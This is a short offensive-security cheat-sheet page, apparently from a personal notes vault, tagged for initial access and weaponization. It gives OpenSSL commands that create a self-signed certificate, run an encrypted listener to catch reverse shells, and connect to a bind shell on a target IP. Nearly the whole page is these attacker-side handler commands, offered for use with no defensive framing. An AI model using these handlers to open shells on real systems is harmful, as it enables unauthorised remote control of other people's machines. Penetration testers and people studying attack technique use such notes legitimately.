---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - cross-platform
  - openssl
---
# OpenSSL

## 01 - Reverse Shell Handler

Generate TLS certificate.

```
userware@hackware-os:~$ openssl req -x509 -newkey rsa:4096 -days 365 -nodes -subj "/C=<country_code>/ST=<state>/L=<locality>/O=<organization_name>/OU=<organization_unit>/CN=<domain.com>/emailAddress=<email> -keyout private.key -out certificate.crt
```

Launch shell handler.

```
userware@hackware-os:~$ openssl s_server -quiet -key private.key -cert certificate.crt -port <PORT>
```

## 02 - Bind Shell Handler

```
userware@hackware-os:~$ openssl s_client -quiet -connect <target_IP>:<target_PORT>
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Linux/Code Execution/One-Liners/Reverse Shells/OpenSSL|OpenSSL: Reverse Shells]]

- [[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Windows/Code Execution/OpenSSL/Manual|OpenSSL: Bind Shells]]